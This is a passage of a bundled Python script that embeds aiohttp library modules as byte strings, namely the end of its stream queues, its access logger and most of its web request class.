b""\r\n\r\n    async def readchunk(self) -> Tuple[bytes, bool]:\r\n        return (b"", True)\r\n\r\n    async def readexactly(self, n: int) -> bytes:\r\n        raise asyncio.IncompleteReadError(b"", n)\r\n\r\n    def read_nowait(self, n: int = -1) -> bytes:\r\n        return b""\r\n\r\n\r\nEMPTY_PAYLOAD: Final[StreamReader] = EmptyStreamReader()\r\n\r\n\r\nclass DataQueue(Generic[_T]):\r\n    """DataQueue is a general-purpose blocking queue with one reader."""\r\n\r\n    def __init__(self, loop: asyncio.AbstractEventLoop) -> None:\r\n        self._loop = loop\r\n        self._eof = False\r\n        self._waiter = None  # type: Optional[asyncio.Future[None]]\r\n        self._exception = None  # type: Optional[BaseException]\r\n        self._size = 0\r\n        self._buffer = collections.deque()  # type: Deque[Tuple[_T, int]]\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._buffer)\r\n\r\n    def is_eof(self) -> bool:\r\n        return self._eof\r\n\r\n    def at_eof(self) -> bool:\r\n        return self._eof and not self._buffer\r\n\r\n    def exception(self) -> Optional[BaseException]:\r\n        return self._exception\r\n\r\n    def set_exception(self, exc: BaseException) -> None:\r\n        self._eof = True\r\n        self._exception = exc\r\n\r\n        waiter = self._waiter\r\n        if waiter is not None:\r\n            self._waiter = None\r\n            set_exception(waiter, exc)\r\n\r\n    def feed_data(self, data: _T, size: int = 0) -> None:\r\n        self._size += size\r\n        self._buffer.append((data, size))\r\n\r\n        waiter = self._waiter\r\n        if waiter is not None:\r\n            self._waiter = None\r\n            set_result(waiter, None)\r\n\r\n    def feed_eof(self) -> None:\r\n        self._eof = True\r\n\r\n        waiter = self._waiter\r\n        if waiter is not None:\r\n            self._waiter = None\r\n            set_result(waiter, None)\r\n\r\n    async def read(self) -> _T:\r\n        if not self._buffer and not self._eof:\r\n            assert not self._waiter\r\n            self._waiter = self._loop.create_future()\r\n            try:\r\n                await self._waiter\r\n            except (asyncio.CancelledError, asyncio.TimeoutError):\r\n                self._waiter = None\r\n                raise\r\n\r\n        if self._buffer:\r\n            data, size = self._buffer.popleft()\r\n            self._size -= size\r\n            return data\r\n        else:\r\n            if self._exception is not None:\r\n                raise self._exception\r\n            else:\r\n                raise EofStream\r\n\r\n    def __aiter__(self) -> AsyncStreamIterator[_T]:\r\n        return AsyncStreamIterator(self.read)\r\n\r\n\r\nclass FlowControlDataQueue(DataQueue[_T]):\r\n    """FlowControlDataQueue resumes and pauses an underlying stream.\r\n\r\n    It is a destination for parsed data.\r\n    """\r\n\r\n    def __init__(\r\n        self, protocol: BaseProtocol, limit: int, *, loop: asyncio.AbstractEventLoop\r\n    ) -> None:\r\n        super().__init__(loop=loop)\r\n\r\n        self._protocol = protocol\r\n        self._limit = limit * 2\r\n\r\n    def feed_data(self, data: _T, size: int = 0) -> None:\r\n        super().feed_data(data, size)\r\n\r\n        if self._size > self._limit and not self._protocol._reading_paused:\r\n            self._protocol.pause_reading()\r\n\r\n    async def read(self) -> _T:\r\n        try:\r\n            return await super().read()\r\n        finally:\r\n            if self._size < self._limit and self._protocol._reading_paused:\r\n                self._protocol.resume_reading()\r\n')
    __stickytape_write_module('aiohttp/web_log.py', b'import datetime\r\nimport functools\r\nimport logging\r\nimport os\r\nimport re\r\nfrom collections import namedtuple\r\nfrom typing import Any, Callable, Dict, Iterable, List, Tuple  # noqa\r\n\r\nfrom .abc import AbstractAccessLogger\r\nfrom .web_request import BaseRequest\r\nfrom .web_response import StreamResponse\r\n\r\nKeyMethod = namedtuple("KeyMethod", "key method")\r\n\r\n\r\nclass AccessLogger(AbstractAccessLogger):\r\n    """Helper object to log access.\r\n\r\n    Usage:\r\n        log = logging.getLogger("spam")\r\n        log_format = "%a %{User-Agent}i"\r\n        access_logger = AccessLogger(log, log_format)\r\n        access_logger.log(request, response, time)\r\n\r\n    Format:\r\n        %%  The percent sign\r\n        %a  Remote IP-address (IP-address of proxy if using reverse proxy)\r\n        %t  Time when the request was started to process\r\n        %P  The process ID of the child that serviced the request\r\n        %r  First line of request\r\n        %s  Response status code\r\n        %b  Size of response in bytes, including HTTP headers\r\n        %T  Time taken to serve the request, in seconds\r\n        %Tf Time taken to serve the request, in seconds with floating fraction\r\n            in .06f format\r\n        %D  Time taken to serve the request, in microseconds\r\n        %{FOO}i  request.headers[\'FOO\']\r\n        %{FOO}o  response.headers[\'FOO\']\r\n        %{FOO}e  os.environ[\'FOO\']\r\n\r\n    """\r\n\r\n    LOG_FORMAT_MAP = {\r\n        "a": "remote_address",\r\n        "t": "request_start_time",\r\n        "P": "process_id",\r\n        "r": "first_request_line",\r\n        "s": "response_status",\r\n        "b": "response_size",\r\n        "T": "request_time",\r\n        "Tf": "request_time_frac",\r\n        "D": "request_time_micro",\r\n        "i": "request_header",\r\n        "o": "response_header",\r\n    }\r\n\r\n    LOG_FORMAT = \'%a %t "%r" %s %b "%{Referer}i" "%{User-Agent}i"\'\r\n    FORMAT_RE = re.compile(r"%(\\{([A-Za-z0-9\\-_]+)\\}([ioe])|[atPrsbOD]|Tf?)")\r\n    CLEANUP_RE = re.compile(r"(%[^s])")\r\n    _FORMAT_CACHE = {}  # type: Dict[str, Tuple[str, List[KeyMethod]]]\r\n\r\n    def __init__(self, logger: logging.Logger, log_format: str = LOG_FORMAT) -> None:\r\n        """Initialise the logger.\r\n\r\n        logger is a logger object to be used for logging.\r\n        log_format is a string with apache compatible log format description.\r\n\r\n        """\r\n        super().__init__(logger, log_format=log_format)\r\n\r\n        _compiled_format = AccessLogger._FORMAT_CACHE.get(log_format)\r\n        if not _compiled_format:\r\n            _compiled_format = self.compile_format(log_format)\r\n            AccessLogger._FORMAT_CACHE[log_format] = _compiled_format\r\n\r\n        self._log_format, self._methods = _compiled_format\r\n\r\n    def compile_format(self, log_format: str) -> Tuple[str, List[KeyMethod]]:\r\n        """Translate log_format into form usable by modulo formatting\r\n\r\n        All known atoms will be replaced with %s\r\n        Also methods for formatting of those atoms will be added to\r\n        _methods in appropriate order\r\n\r\n        For example we have log_format = "%a %t"\r\n        This format will be translated to "%s %s"\r\n        Also contents of _methods will be\r\n        [self._format_a, self._format_t]\r\n        These method will be called and results will be passed\r\n        to translated string format.\r\n\r\n        Each _format_* method receive \'args\' which is list of arguments\r\n        given to self.log\r\n\r\n        Exceptions are _format_e, _format_i and _format_o methods which\r\n        also receive key name (by functools.partial)\r\n\r\n        """\r\n        # list of (key, method) tuples, we don\'t use an OrderedDict as users\r\n        # can repeat the same key more than once\r\n        methods = list()\r\n\r\n        for atom in self.FORMAT_RE.findall(log_format):\r\n            if atom[1] == "":\r\n                format_key1 = self.LOG_FORMAT_MAP[atom[0]]\r\n                m = getattr(AccessLogger, "_format_%s" % atom[0])\r\n                key_method = KeyMethod(format_key1, m)\r\n            else:\r\n                format_key2 = (self.LOG_FORMAT_MAP[atom[2]], atom[1])\r\n                m = getattr(AccessLogger, "_format_%s" % atom[2])\r\n                key_method = KeyMethod(format_key2, functools.partial(m, atom[1]))\r\n\r\n            methods.append(key_method)\r\n\r\n        log_format = self.FORMAT_RE.sub(r"%s", log_format)\r\n        log_format = self.CLEANUP_RE.sub(r"%\\1", log_format)\r\n        return log_format, methods\r\n\r\n    @staticmethod\r\n    def _format_i(\r\n        key: str, request: BaseRequest, response: StreamResponse, time: float\r\n    ) -> str:\r\n        if request is None:\r\n            return "(no headers)"\r\n\r\n        # suboptimal, make istr(key) once\r\n        return request.headers.get(key, "-")\r\n\r\n    @staticmethod\r\n    def _format_o(\r\n        key: str, request: BaseRequest, response: StreamResponse, time: float\r\n    ) -> str:\r\n        # suboptimal, make istr(key) once\r\n        return response.headers.get(key, "-")\r\n\r\n    @staticmethod\r\n    def _format_a(request: BaseRequest, response: StreamResponse, time: float) -> str:\r\n        if request is None:\r\n            return "-"\r\n        ip = request.remote\r\n        return ip if ip is not None else "-"\r\n\r\n    @staticmethod\r\n    def _format_t(request: BaseRequest, response: StreamResponse, time: float) -> str:\r\n        now = datetime.datetime.utcnow()\r\n        start_time = now - datetime.timedelta(seconds=time)\r\n        return start_time.strftime("[%d/%b/%Y:%H:%M:%S +0000]")\r\n\r\n    @staticmethod\r\n    def _format_P(request: BaseRequest, response: StreamResponse, time: float) -> str:\r\n        return "<%s>" % os.getpid()\r\n\r\n    @staticmethod\r\n    def _format_r(request: BaseRequest, response: StreamResponse, time: float) -> str:\r\n        if request is None:\r\n            return "-"\r\n        return "{} {} HTTP/{}.{}".format(\r\n            request.method,\r\n            request.path_qs,\r\n            request.version.major,\r\n            request.version.minor,\r\n        )\r\n\r\n    @staticmethod\r\n    def _format_s(request: BaseRequest, response: StreamResponse, time: float) -> int:\r\n        return response.status\r\n\r\n    @staticmethod\r\n    def _format_b(request: BaseRequest, response: StreamResponse, time: float) -> int:\r\n        return response.body_length\r\n\r\n    @staticmethod\r\n    def _format_T(request: BaseRequest, response: StreamResponse, time: float) -> str:\r\n        return str(round(time))\r\n\r\n    @staticmethod\r\n    def _format_Tf(request: BaseRequest, response: StreamResponse, time: float) -> str:\r\n        return "%06f" % time\r\n\r\n    @staticmethod\r\n    def _format_D(request: BaseRequest, response: StreamResponse, time: float) -> str:\r\n        return str(round(time * 1000000))\r\n\r\n    def _format_line(\r\n        self, request: BaseRequest, response: StreamResponse, time: float\r\n    ) -> Iterable[Tuple[str, Callable[[BaseRequest, StreamResponse, float], str]]]:\r\n        return [(key, method(request, response, time)) for key, method in self._methods]\r\n\r\n    def log(self, request: BaseRequest, response: StreamResponse, time: float) -> None:\r\n        try:\r\n            fmt_info = self._format_line(request, response, time)\r\n\r\n            values = list()\r\n            extra = dict()\r\n            for key, value in fmt_info:\r\n                values.append(value)\r\n\r\n                if key.__class__ is str:\r\n                    extra[key] = value\r\n                else:\r\n                    k1, k2 = key  # type: ignore[misc]\r\n                    dct = extra.get(k1, {})  # type: ignore[var-annotated,has-type]\r\n                    dct[k2] = value  # type: ignore[index,has-type]\r\n                    extra[k1] = dct  # type: ignore[has-type,assignment]\r\n\r\n            self.logger.info(self._log_format % tuple(values), extra=extra)\r\n        except Exception:\r\n            self.logger.exception("Error in logging")\r\n')
    __stickytape_write_module('aiohttp/web_request.py', b'import asyncio\r\nimport datetime\r\nimport io\r\nimport re\r\nimport socket\r\nimport string\r\nimport tempfile\r\nimport types\r\nimport warnings\r\nfrom http.cookies import SimpleCookie\r\nfrom types import MappingProxyType\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Dict,\r\n    Iterator,\r\n    Mapping,\r\n    MutableMapping,\r\n    Optional,\r\n    Pattern,\r\n    Tuple,\r\n    Union,\r\n    cast,\r\n)\r\nfrom urllib.parse import parse_qsl\r\n\r\nimport attr\r\nfrom multidict import CIMultiDict, CIMultiDictProxy, MultiDict, MultiDictProxy\r\nfrom yarl import URL\r\n\r\nfrom . import hdrs\r\nfrom .abc import AbstractStreamWriter\r\nfrom .helpers import (\r\n    DEBUG,\r\n    ETAG_ANY,\r\n    LIST_QUOTED_ETAG_RE,\r\n    ChainMapProxy,\r\n    ETag,\r\n    HeadersMixin,\r\n    parse_http_date,\r\n    reify,\r\n    sentinel,\r\n)\r\nfrom .http_parser import RawRequestMessage\r\nfrom .http_writer import HttpVersion\r\nfrom .multipart import BodyPartReader, MultipartReader\r\nfrom .streams import EmptyStreamReader, StreamReader\r\nfrom .typedefs import (\r\n    DEFAULT_JSON_DECODER,\r\n    Final,\r\n    JSONDecoder,\r\n    LooseHeaders,\r\n    RawHeaders,\r\n    StrOrURL,\r\n)\r\nfrom .web_exceptions import HTTPRequestEntityTooLarge\r\nfrom .web_response import StreamResponse\r\n\r\n__all__ = ("BaseRequest", "FileField", "Request")\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .web_app import Application\r\n    from .web_protocol import RequestHandler\r\n    from .web_urldispatcher import UrlMappingMatchInfo\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass FileField:\r\n    name: str\r\n    filename: str\r\n    file: io.BufferedReader\r\n    content_type: str\r\n    headers: "CIMultiDictProxy[str]"\r\n\r\n\r\n_TCHAR: Final[str] = string.digits + string.ascii_letters + r"!#$%&\'*+.^_`|~-"\r\n# \'-\' at the end to prevent interpretation as range in a char class\r\n\r\n_TOKEN: Final[str] = fr"[{_TCHAR}]+"\r\n\r\n_QDTEXT: Final[str] = r"[{}]".format(\r\n    r"".join(chr(c) for c in (0x09, 0x20, 0x21) + tuple(range(0x23, 0x7F)))\r\n)\r\n# qdtext includes 0x5C to escape 0x5D (\'\\]\')\r\n# qdtext excludes obs-text (because obsoleted, and encoding not specified)\r\n\r\n_QUOTED_PAIR: Final[str] = r"\\\\[\\t !-~]"\r\n\r\n_QUOTED_STRING: Final[str] = r\'"(?:{quoted_pair}|{qdtext})*"\'.format(\r\n    qdtext=_QDTEXT, quoted_pair=_QUOTED_PAIR\r\n)\r\n\r\n_FORWARDED_PAIR: Final[\r\n    str\r\n] = r"({token})=({token}|{quoted_string})(:\\d{{1,4}})?".format(\r\n    token=_TOKEN, quoted_string=_QUOTED_STRING\r\n)\r\n\r\n_QUOTED_PAIR_REPLACE_RE: Final[Pattern[str]] = re.compile(r"\\\\([\\t !-~])")\r\n# same pattern as _QUOTED_PAIR but contains a capture group\r\n\r\n_FORWARDED_PAIR_RE: Final[Pattern[str]] = re.compile(_FORWARDED_PAIR)\r\n\r\n############################################################\r\n# HTTP Request\r\n############################################################\r\n\r\n\r\nclass BaseRequest(MutableMapping[str, Any], HeadersMixin):\r\n\r\n    POST_METHODS = {\r\n        hdrs.METH_PATCH,\r\n        hdrs.METH_POST,\r\n        hdrs.METH_PUT,\r\n        hdrs.METH_TRACE,\r\n        hdrs.METH_DELETE,\r\n    }\r\n\r\n    ATTRS = HeadersMixin.ATTRS | frozenset(\r\n        [\r\n            "_message",\r\n            "_protocol",\r\n            "_payload_writer",\r\n            "_payload",\r\n            "_headers",\r\n            "_method",\r\n            "_version",\r\n            "_rel_url",\r\n            "_post",\r\n            "_read_bytes",\r\n            "_state",\r\n            "_cache",\r\n            "_task",\r\n            "_client_max_size",\r\n            "_loop",\r\n            "_transport_sslcontext",\r\n            "_transport_peername",\r\n        ]\r\n    )\r\n\r\n    def __init__(\r\n        self,\r\n        message: RawRequestMessage,\r\n        payload: StreamReader,\r\n        protocol: "RequestHandler",\r\n        payload_writer: AbstractStreamWriter,\r\n        task: "asyncio.Task[None]",\r\n        loop: asyncio.AbstractEventLoop,\r\n        *,\r\n        client_max_size: int = 1024 ** 2,\r\n        state: Optional[Dict[str, Any]] = None,\r\n        scheme: Optional[str] = None,\r\n        host: Optional[str] = None,\r\n        remote: Optional[str] = None,\r\n    ) -> None:\r\n        if state is None:\r\n            state = {}\r\n        self._message = message\r\n        self._protocol = protocol\r\n        self._payload_writer = payload_writer\r\n\r\n        self._payload = payload\r\n        self._headers = message.headers\r\n        self._method = message.method\r\n        self._version = message.version\r\n        self._rel_url = message.url\r\n        self._post = (\r\n            None\r\n        )  # type: Optional[MultiDictProxy[Union[str, bytes, FileField]]]\r\n        self._read_bytes = None  # type: Optional[bytes]\r\n\r\n        self._state = state\r\n        self._cache = {}  # type: Dict[str, Any]\r\n        self._task = task\r\n        self._client_max_size = client_max_size\r\n        self._loop = loop\r\n\r\n        transport = self._protocol.transport\r\n        assert transport is not None\r\n        self._transport_sslcontext = transport.get_extra_info("sslcontext")\r\n        self._transport_peername = transport.get_extra_info("peername")\r\n\r\n        if scheme is not None:\r\n            self._cache["scheme"] = scheme\r\n        if host is not None:\r\n            self._cache["host"] = host\r\n        if remote is not None:\r\n            self._cache["remote"] = remote\r\n\r\n    def clone(\r\n        self,\r\n        *,\r\n        method: str = sentinel,\r\n        rel_url: StrOrURL = sentinel,\r\n        headers: LooseHeaders = sentinel,\r\n        scheme: str = sentinel,\r\n        host: str = sentinel,\r\n        remote: str = sentinel,\r\n    ) -> "BaseRequest":\r\n        """Clone itself with replacement some attributes.\r\n\r\n        Creates and returns a new instance of Request object. If no parameters\r\n        are given, an exact copy is returned. If a parameter is not passed, it\r\n        will reuse the one from the current request object.\r\n        """\r\n        if self._read_bytes:\r\n            raise RuntimeError("Cannot clone request " "after reading its content")\r\n\r\n        dct = {}  # type: Dict[str, Any]\r\n        if method is not sentinel:\r\n            dct["method"] = method\r\n        if rel_url is not sentinel:\r\n            new_url = URL(rel_url)\r\n            dct["url"] = new_url\r\n            dct["path"] = str(new_url)\r\n        if headers is not sentinel:\r\n            # a copy semantic\r\n            dct["headers"] = CIMultiDictProxy(CIMultiDict(headers))\r\n            dct["raw_headers"] = tuple(\r\n                (k.encode("utf-8"), v.encode("utf-8")) for k, v in headers.items()\r\n            )\r\n\r\n        message = self._message._replace(**dct)\r\n\r\n        kwargs = {}\r\n        if scheme is not sentinel:\r\n            kwargs["scheme"] = scheme\r\n        if host is not sentinel:\r\n            kwargs["host"] = host\r\n        if remote is not sentinel:\r\n            kwargs["remote"] = remote\r\n\r\n        return self.__class__(\r\n            message,\r\n            self._payload,\r\n            self._protocol,\r\n            self._payload_writer,\r\n            self._task,\r\n            self._loop,\r\n            client_max_size=self._client_max_size,\r\n            state=self._state.copy(),\r\n            **kwargs,\r\n        )\r\n\r\n    @property\r\n    def task(self) -> "asyncio.Task[None]":\r\n        return self._task\r\n\r\n    @property\r\n    def protocol(self) -> "RequestHandler":\r\n        return self._protocol\r\n\r\n    @property\r\n    def transport(self) -> Optional[asyncio.Transport]:\r\n        if self._protocol is None:\r\n            return None\r\n        return self._protocol.transport\r\n\r\n    @property\r\n    def writer(self) -> AbstractStreamWriter:\r\n        return self._payload_writer\r\n\r\n    @reify\r\n    def message(self) -> RawRequestMessage:\r\n        warnings.warn("Request.message is deprecated", DeprecationWarning, stacklevel=3)\r\n        return self._message\r\n\r\n    @reify\r\n    def rel_url(self) -> URL:\r\n        return self._rel_url\r\n\r\n    @reify\r\n    def loop(self) -> asyncio.AbstractEventLoop:\r\n        warnings.warn(\r\n            "request.loop property is deprecated", DeprecationWarning, stacklevel=2\r\n        )\r\n        return self._loop\r\n\r\n    # MutableMapping API\r\n\r\n    def __getitem__(self, key: str) -> Any:\r\n        return self._state[key]\r\n\r\n    def __setitem__(self, key: str, value: Any) -> None:\r\n        self._state[key] = value\r\n\r\n    def __delitem__(self, key: str) -> None:\r\n        del self._state[key]\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._state)\r\n\r\n    def __iter__(self) -> Iterator[str]:\r\n        return iter(self._state)\r\n\r\n    ########\r\n\r\n    @reify\r\n    def secure(self) -> bool:\r\n        """A bool indicating if the request is handled with SSL."""\r\n        return self.scheme == "https"\r\n\r\n    @reify\r\n    def forwarded(self) -> Tuple[Mapping[str, str], ...]:\r\n        """A tuple containing all parsed Forwarded header(s).\r\n\r\n        Makes an effort to parse Forwarded headers as specified by RFC 7239:\r\n\r\n        - It adds one (immutable) dictionary per Forwarded \'field-value\', ie\r\n          per proxy. The element corresponds to the data in the Forwarded\r\n          field-value added by the first proxy encountered by the client. Each\r\n          subsequent item corresponds to those added by later proxies.\r\n        - It checks that every value has valid syntax in general as specified\r\n          in section 4: either a \'token\' or a \'quoted-string\'.\r\n        - It un-escapes found escape sequences.\r\n        - It does NOT validate \'by\' and \'for\' contents as specified in section\r\n          6.\r\n        - It does NOT validate \'host\' contents (Host ABNF).\r\n        - It does NOT validate \'proto\' contents for valid URI scheme names.\r\n\r\n        Returns a tuple containing one or more immutable dicts\r\n        """\r\n        elems = []\r\n        for field_value in self._message.headers.getall(hdrs.FORWARDED, ()):\r\n            length = len(field_value)\r\n            pos = 0\r\n            need_separator = False\r\n            elem = {}  # type: Dict[str, str]\r\n            elems.append(types.MappingProxyType(elem))\r\n            while 0 <= pos < length:\r\n                match = _FORWARDED_PAIR_RE.match(field_value, pos)\r\n                if match is not None:  # got a valid forwarded-pair\r\n                    if need_separator:\r\n                        # bad syntax here, skip to next comma\r\n                        pos = field_value.find(",", pos)\r\n                    else:\r\n                        name, value, port = match.groups()\r\n                        if value[0] == \'"\':\r\n                            # quoted string: remove quotes and unescape\r\n                            value = _QUOTED_PAIR_REPLACE_RE.sub(r"\\1", value[1:-1])\r\n                        if port:\r\n                            value += port\r\n                        elem[name.lower()] = value\r\n                        pos += len(match.group(0))\r\n                        need_separator = True\r\n                elif field_value[pos] == ",":  # next forwarded-element\r\n                    need_separator = False\r\n                    elem = {}\r\n                    elems.append(types.MappingProxyType(elem))\r\n                    pos += 1\r\n                elif field_value[pos] == ";":  # next forwarded-pair\r\n                    need_separator = False\r\n                    pos += 1\r\n                elif field_value[pos] in " \\t":\r\n                    # Allow whitespace even between forwarded-pairs, though\r\n                    # RFC 7239 doesn\'t. This simplifies code and is in line\r\n                    # with Postel\'s law.\r\n                    pos += 1\r\n                else:\r\n                    # bad syntax here, skip to next comma\r\n                    pos = field_value.find(",", pos)\r\n        return tuple(elems)\r\n\r\n    @reify\r\n    def scheme(self) -> str:\r\n        """A string representing the scheme of the request.\r\n\r\n        Hostname is resolved in this order:\r\n\r\n        - overridden value by .clone(scheme=new_scheme) call.\r\n        - type of connection to peer: HTTPS if socket is SSL, HTTP otherwise.\r\n\r\n        \'http\' or \'https\'.\r\n        """\r\n        if self._transport_sslcontext:\r\n            return "https"\r\n        else:\r\n            return "http"\r\n\r\n    @reify\r\n    def method(self) -> str:\r\n        """Read only property for getting HTTP method.\r\n\r\n        The value is upper-cased str like \'GET\', \'POST\', \'PUT\' etc.\r\n        """\r\n        return self._method\r\n\r\n    @reify\r\n    def version(self) -> HttpVersion:\r\n        """Read only property for getting HTTP version of request.\r\n\r\n        Returns aiohttp.protocol.HttpVersion instance.\r\n        """\r\n        return self._version\r\n\r\n    @reify\r\n    def host(self) -> str:\r\n        """Hostname of the request.\r\n\r\n        Hostname is resolved in this order:\r\n\r\n        - overridden value by .clone(host=new_host) call.\r\n        - HOST HTTP header\r\n        - socket.getfqdn() value\r\n        """\r\n        host = self._message.headers.get(hdrs.HOST)\r\n        if host is not None:\r\n            return host\r\n        return socket.getfqdn()\r\n\r\n    @reify\r\n    def remote(self) -> Optional[str]:\r\n        """Remote IP of client initiated HTTP request.\r\n\r\n        The IP is resolved in this order:\r\n\r\n        - overridden value by .clone(remote=new_remote) call.\r\n        - peername of opened socket\r\n        """\r\n        if self._transport_peername is None:\r\n            return None\r\n        if isinstance(self._transport_peername, (list, tuple)):\r\n            return str(self._transport_peername[0])\r\n        return str(self._transport_peername)\r\n\r\n    @reify\r\n    def url(self) -> URL:\r\n        url = URL.build(scheme=self.scheme, host=self.host)\r\n        return url.join(self._rel_url)\r\n\r\n    @reify\r\n    def path(self) -> str:\r\n        """The URL including *PATH INFO* without the host or scheme.\r\n\r\n        E.g., ``/app/blog``\r\n        """\r\n        return self._rel_url.path\r\n\r\n    @reify\r\n    def path_qs(self) -> str:\r\n        """The URL including PATH_INFO and the query string.\r\n\r\n        E.g, /app/blog?id=10\r\n        """\r\n        return str(self._rel_url)\r\n\r\n    @reify\r\n    def raw_path(self) -> str:\r\n        """The URL including raw *PATH INFO* without the host or scheme.\r\n\r\n        Warning, the path is unquoted and may contains non valid URL characters\r\n\r\n        E.g., ``/my%2Fpath%7Cwith%21some%25strange%24characters``\r\n        """\r\n        return self._message.path\r\n\r\n    @reify\r\n    def query(self) -> "MultiDictProxy[str]":\r\n        """A multidict with all the variables in the query string."""\r\n        return MultiDictProxy(self._rel_url.query)\r\n\r\n    @reify\r\n    def query_string(self) -> str:\r\n        """The query string in the URL.\r\n\r\n        E.g., id=10\r\n        """\r\n        return self._rel_url.query_string\r\n\r\n    @reify\r\n    def headers(self) -> "CIMultiDictProxy[str]":\r\n        """A case-insensitive multidict proxy with all headers."""\r\n        return self._headers\r\n\r\n    @reify\r\n    def raw_headers(self) -> RawHeaders:\r\n        """A sequence of pairs for all headers."""\r\n        return self._message.raw_headers\r\n\r\n    @reify\r\n    def if_modified_since(self) -> Optional[datetime.datetime]:\r\n        """The value of If-Modified-Since HTTP header, or None.\r\n\r\n        This header is represented as a `datetime` object.\r\n        """\r\n        return parse_http_date(self.headers.get(hdrs.IF_MODIFIED_SINCE))\r\n\r\n    @reify\r\n    def if_unmodified_since(self) -> Optional[datetime.datetime]:\r\n        """The value of If-Unmodified-Since HTTP header, or None.\r\n\r\n        This header is represented as a `datetime` object.\r\n        """\r\n        return parse_http_date(self.headers.get(hdrs.IF_UNMODIFIED_SINCE))\r\n\r\n    @staticmethod\r\n    def _etag_values(etag_header: str) -> Iterator[ETag]:\r\n        """Extract `ETag` objects from raw header."""\r\n        if etag_header == ETAG_ANY:\r\n            yield ETag(\r\n                is_weak=False,\r\n                value=ETAG_ANY,\r\n            )\r\n        else:\r\n            for match in LIST_QUOTED_ETAG_RE.finditer(etag_header):\r\n                is_weak, value, garbage = match.group(2, 3, 4)\r\n                # Any symbol captured by 4th group means\r\n                # that the following sequence is invalid.\r\n                if garbage:\r\n                    break\r\n\r\n                yield ETag(\r\n                    is_weak=bool(is_weak),\r\n                    value=value,\r\n                )\r\n\r\n    @classmethod\r\n    def _if_match_or_none_impl(\r\n        cls, header_value: Optional[str]\r\n    ) -> Optional[Tuple[ETag, ...]]:\r\n        if not header_value:\r\n            return None\r\n\r\n        return tuple(cls._etag_values(header_value))\r\n\r\n    @reify\r\n    def if_match(self) -> Optional[Tuple[ETag, ...]]:\r\n        """The value of If-Match HTTP header, or None.\r\n\r\n        This header is represented as a `tuple` of `ETag` objects.\r\n        """\r\n        return self._if_match_or_none_impl(self.headers.get(hdrs.IF_MATCH))\r\n\r\n    @reify\r\n    def if_none_match(self) -> Optional[Tuple[ETag, ...]]:\r\n        """The value of If-None-Match HTTP header, or None.\r\n\r\n        This header is represented as a `tuple` of `ETag` objects.\r\n        """\r\n        return self._if_match_or_none_impl(self.headers.get(hdrs.IF_NONE_MATCH))\r\n\r\n    @reify\r\n    def if_range(self) -> Optional[datetime.datetime]:\r\n        """The value of If-Range HTTP header, or None.\r\n\r\n        This header is represented as a `datetime` object.\r\n        """\r\n        return parse_http_date(self.headers.get(hdrs.IF_RANGE))\r\n\r\n    @reify\r\n    def keep_alive(self) -> bool:\r\n        """Is keepalive enabled by client?"""\r\n        return not self._message.should_close\r\n\r\n    @reify\r\n    def cookies(self) -> Mapping[str, str]:\r\n        """Return request cookies.\r\n\r\n        A read-only dictionary-like object.\r\n        """\r\n        raw = self.headers.get(hdrs.COOKIE, "")\r\n        parsed = SimpleCookie(raw)  # type: SimpleCookie[str]\r\n        return MappingProxyType({key: val.value for key, val in parsed.items()})\r\n\r\n    @reify\r\n    def http_range(self) -> slice:\r\n        """The content of Range HTTP header.\r\n\r\n        Return a slice instance.\r\n\r\n        """\r\n        rng = self._headers.get(hdrs.RANGE)\r\n        start, end = None, None\r\n        if rng is not None:\r\n            try:\r\n                pattern = r"^bytes=(\\d*)-(\\d*)$"\r\n                start, end = re.findall(pattern, rng)[0]\r\n            except IndexError:  # pattern was not found in header\r\n                raise ValueError("range not in acceptable format")\r\n\r\n            end = int(end) if end else None\r\n            start = int(start) if start else None\r\n\r\n            if start is None and end is not None:\r\n                # end with no start is to return tail of content\r\n                start = -end\r\n                end = None\r\n\r\n            if start is not None and end is not None:\r\n                # end is inclusive in range header, exclusive for slice\r\n                end += 1\r\n\r\n                if start >= end:\r\n                    raise ValueError("start cannot be after end")\r\n\r\n            if start is end is None:  # No valid range supplied\r\n                raise ValueError("No start or end of range specified")\r\n\r\n        return slice(start, end, 1)\r\n\r\n    @reify\r\n    def content(self) -> StreamReader:\r\n        """Return raw payload stream."""\r\n        return self._payload\r\n\r\n    @property\r\n    def has_body(self) -> bool:\r\n        """Return True if request\'s HTTP BODY can be read, False otherwise."""\r\n        warnings.warn(\r\n            "Deprecated, use .can_read_body #2005", DeprecationWarning, stacklevel=2\r\n        )\r\n        return not self._payload.at_eof()\r\n\r\n    @property\r\n    def can_read_body(self) -> bool:\r\n        """Return True if request\'s HTTP BODY can be read, False otherwise."""\r\n        return not self._payload.at_eof()\r\n\r\n    @reify\r\n    def body_exists(self) -> bool:\r\n        """Return True if request has HTTP BODY, False otherwise."""\r\n        return type(self._payload) is not EmptyStreamReader\r\n\r\n    async def release(self) -> None:\r\n        """Release request.\r\n\r\n        Eat unread part of HTTP BODY if present.\r\n        """\r\n        while not self._payload.at_eof():\r\n            await self._payload.readany()\r\n\r\n    async def read(self) -> bytes:\r\n        """Read request body if present.\r\n\r\n        Returns bytes object with full request content.\r\n        """\r\n        if self._read_bytes is None:\r\n            body = bytearray()\r\n            while True:\r\n                chunk = await self._payload.readany()\r\n                body.extend(chunk)\r\n                if self._client_max_size:\r\n                    body_size = len(body)\r\n                    if body_size >= self._client_max_size:\r\n                        raise HTTPRequestEntityTooLarge(\r\n                            max_size=self._client_max_size, actual_size=body_size\r\n                        )\r\n                if not chunk:\r\n                    break\r\n            self._read_bytes = bytes(body)\r\n        return self._read_bytes\r\n\r\n    async def text(self) -> str:\r\n        """Return BODY as text using encoding from .charset."""\r\n        bytes_body = await self.read()\r\n        encoding = self.charset or "utf-8"\r\n        return bytes_body.decode(encoding)\r\n\r\n    async def json(self, *, loads: JSONDecoder = DEFAULT_JSON_DECODER) -> Any:\r\n        """Return BODY as JSON."""\r\n        body = await self.text()\r\n        return loads(body)\r\n\r\n    async def multipart(self) -> MultipartReader:\r\n        """Return async iterator to process BODY as multipart."""\r\n        return MultipartReader(self._headers, self._payload)\r\n\r\n    async def post(self) -> "MultiDictProxy[Union[str, bytes, FileField]]":\r\n        """Return POST parameters."""\r\n        if self._post is not None:\r\n            return self._post\r\n        if self._method not in self.POST_METHODS:\r\n            self._post = MultiDictProxy(MultiDict())\r\n            return self._post\r\n\r\n        content_type = self.content_type\r\n        if content_type 